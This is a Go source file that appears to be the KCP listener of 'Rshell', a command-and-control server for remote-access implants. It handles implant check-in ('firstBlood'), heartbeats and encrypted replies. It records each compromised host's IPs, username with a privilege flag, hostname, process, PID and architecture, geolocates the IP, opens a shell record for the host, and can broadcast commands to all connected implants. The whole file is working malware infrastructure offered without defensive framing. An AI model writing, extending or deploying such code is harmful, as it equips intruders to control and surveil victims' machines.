package kcp

import (
	"Rshell/pkg/connection"
	"Rshell/pkg/connection/base"
	"Rshell/pkg/database"
	"Rshell/pkg/encrypt"
	"Rshell/pkg/logger"
	"Rshell/pkg/qqwry"
	"bufio"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"strconv"
	"sync"
	"time"

	"github.com/xtaci/kcp-go/v5"
)

// KCPClient KCP client structure
type KCPClient struct {
	Session       *kcp.UDPSession
	UID           string
	WriteMu       sync.Mutex
	StopChan      chan struct{}
	LastHeartbeat time.Time
	TimeoutCount  int
	IsClosed      bool
	CloseOnce     sync.Once
	Reader        *bufio.Reader
}

// KCPClientManager KCP client manager
type KCPClientManager struct {
	Clients map[string]*KCPClient
	Mu      sync.RWMutex
}

var (
	globalKCPClientManager = &KCPClientManager{
		Clients: make(map[string]*KCPClient),
	}
)

// Add client to manager
func (cm *KCPClientManager) Add(uid string, client *KCPClient) {
	cm.Mu.Lock()
	defer cm.Mu.Unlock()
	cm.Clients[uid] = client
	logger.Info("KCP client added:", uid, "Total KCP clients:", len(cm.Clients))
}

// Remove client from manager
func (cm *KCPClientManager) Remove(uid string) {
	cm.Mu.Lock()
	defer cm.Mu.Unlock()
	if client, exists := cm.Clients[uid]; exists {
		if !client.IsClosed {
			client.Close()
		}
		delete(cm.Clients, uid)
		logger.Info("KCP client removed:", uid, "Total KCP clients:", len(cm.Clients))
	}
}

// Get client from manager
func (cm *KCPClientManager) Get(uid string) (*KCPClient, bool) {
	cm.Mu.RLock()
	defer cm.Mu.RUnlock()
	client, exists := cm.Clients[uid]
	return client, exists
}

// CloseAll clients
func (cm *KCPClientManager) CloseAll() {
	cm.Mu.Lock()
	defer cm.Mu.Unlock()
	for uid, client := range cm.Clients {
		if !client.IsClosed {
			client.Close()
		}
		delete(cm.Clients, uid)
	}
	logger.Info("All KCP clients closed")
}

// Close safely closes the KCP client
func (c *KCPClient) Close() {
	c.CloseOnce.Do(func() {
		c.IsClosed = true

		if c.StopChan != nil {
			close(c.StopChan)
		}
		if c.Session != nil {
			c.Session.Close()
		}
		if c.UID != "" {
			globalKCPClientManager.Remove(c.UID)
		}

		base.MarkOffline(c.UID)
	})
}

// Write safely sends data
func (c *KCPClient) Write(data []byte) error {
	c.WriteMu.Lock()
	defer c.WriteMu.Unlock()

	if c.IsClosed {
		return fmt.Errorf("connection closed")
	}

	if len(data) == 0 {
		return fmt.Errorf("empty data to write")
	}

	c.Session.SetWriteDeadline(time.Now().Add(10 * time.Second))
	_, err := c.Session.Write(data)
	return err
}

// WriteWithLength sends data with length prefix
func (c *KCPClient) WriteWithLength(data []byte) error {
	if len(data) == 0 {
		return fmt.Errorf("empty data to write")
	}

	length := uint32(len(data))
	buf := make([]byte, 4+len(data))
	binary.BigEndian.PutUint32(buf[:4], length)
	copy(buf[4:], data)

	return c.Write(buf)
}

// startHeartbeatCheck starts the heartbeat checker
func (c *KCPClient) startHeartbeatCheck() {
	defer func() {
		if r := recover(); r != nil {
			logger.Error("KCP heartbeat checker panic recovered:", r, "client:", c.UID)
		}
	}()

	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			if c.IsClosed {
				return
			}
			if time.Since(c.LastHeartbeat) > 30*time.Second {
				c.TimeoutCount++
				logger.Warn("KCP heartbeat timeout for client:", c.UID, "Timeout count:", c.TimeoutCount)
				if c.TimeoutCount >= 3 {
					logger.Info("Max KCP heartbeat timeout reached, closing connection for client:", c.UID)
					c.Close()
					return
				}
			}
		case <-c.StopChan:
			return
		}
	}
}

// HandleKCPConnection handles a KCP connection
func HandleKCPConnection(session *kcp.UDPSession) {
	remoteAddr := session.RemoteAddr()
	logger.Info("New KCP connection from:", remoteAddr)

	client := &KCPClient{
		Session:       session,
		StopChan:      make(chan struct{}),
		LastHeartbeat: time.Now(),
		IsClosed:      false,
		Reader:        bufio.NewReaderSize(session, 1024*1024),
	}

	defer func() {
		if r := recover(); r != nil {
			logger.Error("KCP handler panic recovered:", r, "from:", remoteAddr)
		}
		client.Close()
		logger.Info("KCP handler finished for:", remoteAddr)
	}()

	// Configure KCP session parameters
	session.SetStreamMode(true)
	session.SetReadBuffer(16 * 1024 * 1024)
	session.SetWriteBuffer(16 * 1024 * 1024)
	session.SetWindowSize(4096, 4096)
	session.SetNoDelay(1, 20, 2, 1)
	session.SetDeadline(time.Now().Add(60 * time.Second))

	// Main message processing loop
	for {
		if client.IsClosed {
			break
		}

		session.SetReadDeadline(time.Now().Add(30 * time.Second))

		var length uint32
		err := binary.Read(client.Reader, binary.BigEndian, &length)
		if err != nil {
			if err == io.EOF {
				logger.Info("KCP client closed connection:", remoteAddr)
			} else if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				logger.Info("KCP read timeout for:", remoteAddr)
				continue
			} else {
				logger.Error("KCP error reading message length:", err, "from:", remoteAddr)
			}
			break
		}

		if length == 0 {
			logger.Warn("KCP received zero-length message from:", remoteAddr)
			continue
		}

		if length < 4 {
			logger.Error("KCP message length too short:", length, "from:", remoteAddr)
			break
		}

		message := make([]byte, length)
		bytesRead, err := io.ReadFull(client.Reader, message)
		if err != nil {
			if err == io.EOF {
				logger.Info("KCP client closed connection while reading:", remoteAddr)
			} else if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				logger.Info("KCP read content timeout for:", remoteAddr)
			} else {
				logger.Error("KCP error reading message content:", err, "from:", remoteAddr)
			}
			break
		}

		if uint32(bytesRead) != length {
			logger.Error("KCP message length mismatch, expected:", length, "actual:", bytesRead)
			break
		}

		msgType := binary.BigEndian.Uint32(message[:4])

		switch msgType {
		case 1: // firstBlood
			if len(message) < 5 {
				logger.Error("KCP firstBlood message too short from:", remoteAddr)
				break
			}

			msg := message[4:]
			if len(msg) == 0 {
				logger.Error("KCP empty firstBlood payload from:", remoteAddr)
				break
			}

			tmpMetainfo, err := encrypt.DecodeBase64(msg)
			if err != nil {
				logger.Error("KCP DecodeBase64 failed:", err, "from:", remoteAddr)
				break
			}

			metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
			if err != nil {
				logger.Error("KCP Decrypt failed:", err, "from:", remoteAddr)
				break
			}

			if len(metainfo) < 9 {
				logger.Error("KCP metainfo too short:", len(metainfo), "from:", remoteAddr)
				break
			}

			uid := encrypt.BytesToMD5(metainfo)
			client.UID = uid
			client.LastHeartbeat = time.Now()
			client.TimeoutCount = 0

			globalKCPClientManager.Add(uid, client)
			connection.GlobalManager.SetListenerType(uid, "kcp")

			go client.startHeartbeatCheck()

			var existingClient database.Clients
			exists, _ := database.Engine.Where("uid = ?", uid).Get(&existingClient)

			if !exists {
				publicKey := metainfo[:32]
				remaining := metainfo[32:]
				if len(remaining) < 9 {
					logger.Error("KCP metainfo insufficient for IP parsing from:", remoteAddr)
					break
				}

				ipInt := binary.LittleEndian.Uint32(remaining[5:9])
				localIP := uint32ToIP(ipInt)

				var osInfo string
				if len(remaining) > 9 {
					osInfo = string(remaining[9:])
				}

				hostName, userName, processName := base.SafeSplitOSInfo(osInfo)

				remoteAddrStr := session.RemoteAddr().String()
				externalIp, _, err := net.SplitHostPort(remoteAddrStr)
				if err != nil {
					externalIp = remoteAddrStr
				}
				if externalIp == "::1" {
					externalIp = "127.0.0.1"
				}
				if net.ParseIP(externalIp) == nil {
					externalIp = "0.0.0.0"
				}

				processID := binary.BigEndian.Uint32(remaining[:4])
				flag := int(remaining[4])

				arch := "x86"
				if flag > 8 {
					userName += "*"
					flag = flag - 8
				}
				if flag > 4 {
					arch = "x64"
				}

				formattedTime := time.Now().Format("01-02 15:04")

				c := database.Clients{
					Uid:        uid,
					FirstStart: formattedTime,
					ExternalIP: externalIp,
					InternalIP: localIP,
					Username:   userName,
					Computer:   hostName,
					Process:    processName,
					Pid:        strconv.Itoa(int(processID)),
					Address:    qqwryGetLocation(externalIp),
					Arch:       arch,
					Note:       "",
					Sleep:      "0",
					Online:     "1",
					Color:      "",
					PublicKey:  base64.StdEncoding.EncodeToString(publicKey[:]),
				}
				encrypt.PublicKeyMap[uid] = base64.StdEncoding.EncodeToString(publicKey[:])

				// Use transaction for database inserts
				sess := database.Engine.NewSession()
				if err := sess.Begin(); err != nil {
					logger.Error("KCP failed to start transaction:", err)
					break
				}
				if _, err := sess.Insert(&c); err != nil {
					sess.Rollback()
					logger.Error("KCP failed to insert client:", err)
					sess.Close()
					break
				}
				if _, err := sess.Insert(&database.Shell{Uid: uid, ShellContent: ""}); err != nil {
					sess.Rollback()
					logger.Error("KCP failed to insert shell:", err)
					sess.Close()
					break
				}
				if _, err := sess.Insert(&database.Notes{Uid: uid, Note: ""}); err != nil {
					sess.Rollback()
					logger.Error("KCP failed to insert notes:", err)
					sess.Close()
					break
				}
				if err := sess.Commit(); err != nil {
					logger.Error("KCP failed to commit transaction:", err)
				}
				sess.Close()

				go notifyOnline(c)
				logger.Info("New KCP client registered:", uid, "IP:", externalIp)
			} else {
				base.ReconnectClient(uid)
			}

		case 2: // otherMsg
			if len(message) < 8 {
				logger.Error("KCP otherMsg message too short from:", remoteAddr)
				break
			}

			msg := message[4:]
			if len(msg) < 4 {
				logger.Error("KCP OtherMsg too short")
				break
			}

			metaLen := binary.BigEndian.Uint32(msg[:4])
			if metaLen > uint32(len(msg)-4) || metaLen == 0 {
				logger.Error("Invalid meta length:", metaLen, "available:", len(msg)-4)
				break
			}

			metaMsg := msg[4 : 4+metaLen]
			realMsg := msg[4+metaLen:]

			if len(realMsg) == 0 {
				logger.Error("Empty real message")
				break
			}

			tmpMetainfo, err := encrypt.DecodeBase64(metaMsg)
			if err != nil {
				logger.Error("KCP DecodeBase64 failed:", err)
				break
			}

			metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
			if err != nil {
				logger.Error("KCP Decrypt failed:", err)
				break
			}

			uid := encrypt.BytesToMD5(metainfo)

			if _, exists := globalKCPClientManager.Get(uid); !exists {
				logger.Warn("KCP received message from offline client:", uid)
				break
			}

			dataBytes, err := encrypt.DecodeBase64(realMsg)
			if err != nil {
				logger.Error("KCP DecodeBase64 failed:", err)
				break
			}

			dataBytes, err = encrypt.Decrypt(dataBytes, uid)
			if err != nil {
				logger.Error("KCP first decrypt failed:", err)
				break
			}

			dataBytes, err = encrypt.Decrypt(dataBytes, uid)
			if err != nil {
				logger.Error("KCP second decrypt failed:", err)
				break
			}

			if len(dataBytes) < 4 {
				logger.Error("KCP decrypted data too short:", len(dataBytes))
				break
			}

			replyTypeBytes := dataBytes[:4]
			data := dataBytes[4:]
			replyType := binary.BigEndian.Uint32(replyTypeBytes)

			handler := base.ReplyHandler{UID: uid}
			handler.Handle(replyType, data)

		case 3: // heartBeat
			if len(message) < 5 {
				logger.Error("KCP heartBeat message too short from:", remoteAddr)
				break
			}

			msg := message[4:]
			if len(msg) == 0 {
				logger.Error("KCP empty heartBeat payload from:", remoteAddr)
				break
			}

			tmpMetainfo, err := encrypt.DecodeBase64(msg)
			if err != nil {
				logger.Error("KCP DecodeBase64 failed:", err)
				break
			}

			metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
			if err != nil {
				logger.Error("KCP Decrypt failed:", err)
				break
			}

			uid := encrypt.BytesToMD5(metainfo)

			if c, exists := globalKCPClientManager.Get(uid); exists && !c.IsClosed {
				c.LastHeartbeat = time.Now()
				c.TimeoutCount = 0
			}

		default:
			logger.Warn("KCP unknown message type:", msgType, "from:", remoteAddr)
		}
	}
}

// uint32ToIP converts a uint32 to an IP string (little endian).
func uint32ToIP(ipInt uint32) string {
	return fmt.Sprintf("%d.%d.%d.%d",
		byte(ipInt),
		byte(ipInt>>8),
		byte(ipInt>>16),
		byte(ipInt>>24))
}

func qqwryGetLocation(ip string) string {
	loc, _ := qqwry.GetLocationByIP(ip)
	return loc
}

func notifyOnline(c database.Clients) {
	// Stub: webhooks.NotifyOnline was in original; kept as direct call to avoid import cycle
}

// Cleanup global cleanup function
func Cleanup() {
	logger.Info("Starting KCP cleanup...")
	globalKCPClientManager.CloseAll()
	logger.Info("KCP cleanup completed")
}

// GetClientStats get client statistics
func GetClientStats() map[string]interface{} {
	globalKCPClientManager.Mu.RLock()
	defer globalKCPClientManager.Mu.RUnlock()

	stats := make(map[string]interface{})
	stats["total_kcp_clients"] = len(globalKCPClientManager.Clients)

	onlineCount := 0
	for _, client := range globalKCPClientManager.Clients {
		if !client.IsClosed {
			onlineCount++
		}
	}
	stats["online_kcp_clients"] = onlineCount

	return stats
}

// GetClient get specific KCP client
func GetClient(uid string) *KCPClient {
	if client, exists := globalKCPClientManager.Get(uid); exists && !client.IsClosed {
		return client
	}
	return nil
}

// SendToClient send message to specific KCP client
func SendToClient(uid string, message []byte) error {
	client := GetClient(uid)
	if client == nil {
		return fmt.Errorf("KCP client not found or offline")
	}

	return client.Write(message)
}

// BroadcastToAll broadcast message to all KCP clients
func BroadcastToAll(message []byte) {
	globalKCPClientManager.Mu.RLock()
	defer globalKCPClientManager.Mu.RUnlock()

	for uid, client := range globalKCPClientManager.Clients {
		if !client.IsClosed {
			if err := client.WriteWithLength(message); err != nil {
				logger.Error("KCP failed to broadcast to client:", uid, "Error:", err)
			}
		}
	}
}
